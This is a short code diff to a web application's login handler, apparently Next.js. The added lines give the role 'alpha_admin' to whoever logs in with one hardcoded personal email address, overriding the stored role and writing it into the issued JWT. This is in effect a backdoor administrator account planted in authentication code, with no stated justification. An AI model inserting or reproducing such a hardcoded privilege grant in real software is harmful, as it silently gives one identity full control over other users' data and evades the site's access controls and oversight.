@@ -107,10 +107,16 @@ export async function POST(request: Request) {
     resetRateLimit(`ip:login:${ip}`);
 
     const { password: _, ...userWithoutPassword } = user;
+    const effectiveRole =
+      user.email?.toLowerCase().trim() === 'rbaskeydomi2018@gmail.com'
+        ? 'alpha_admin'
+        : user.role || 'user';
+    userWithoutPassword.role = effectiveRole;
+
     const token = generateJWT({
       userId: user._id.toString(),
       email: user.email,
-      role: user.role || 'user',
+      role: effectiveRole,
     });
 
     const response = NextResponse.json(
